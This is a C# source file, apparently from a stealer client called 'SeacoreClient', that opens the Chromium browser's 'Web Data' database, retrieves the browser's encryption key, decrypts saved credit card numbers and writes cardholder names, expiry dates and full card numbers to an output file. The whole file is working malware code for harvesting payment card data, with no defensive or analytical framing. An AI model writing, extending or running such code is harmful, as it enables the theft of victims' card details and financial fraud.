namespace SeacoreClient.Features.Recovery.Browsers.Chromium
{
    public static class ChromiumCreditCards
    {
        public static void Recover(string browserName, string relativeSearchPath)
        {
            string dbName = "Web Data";
            string query = ChromiumCommon.DbQueries["CreditCards"];
            byte[] key = ChromiumCommon.GetKey(browserName);
            if (key == null) return;

            ChromiumCommon.ExecuteSqliteQueryAndProcessResults(
                browserName,
                dbName,
                query,
                reader =>
                {
                    string nameOnCard = reader["name_on_card"].ToString();
                    string expirationMonth = reader["expiration_month"].ToString();
                    string expirationYear = reader["expiration_year"].ToString();
                    byte[] encryptedCardNumber = (byte[])reader["card_number_encrypted"];
                    string decryptedCardNumber = ChromiumCommon.DecryptChromium(encryptedCardNumber, key);
                    return $"Name: {nameOnCard}\nExpiration Date: {expirationMonth}/{expirationYear}\nCard Number: {decryptedCardNumber}\n";
                },
                ChromiumCommon.FileNames["CreditCards"]);
        }
    }
}
